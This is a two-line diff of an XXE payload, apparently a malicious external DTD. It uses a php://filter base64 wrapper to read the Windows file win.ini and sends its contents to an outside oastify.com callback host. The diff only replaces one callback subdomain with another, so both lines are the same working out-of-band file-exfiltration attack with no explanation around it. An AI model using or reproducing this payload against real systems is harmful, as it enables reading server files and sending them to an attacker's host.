@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini">
-<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://w417bqr6cbj709oa2lvin01as1ysmvak.oastify.com/dtd.xml?%data;'>">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://7nvukrp88bkv1palxs8ebcjosfy6mzao.oastify.com/dtd.xml?%data;'>">
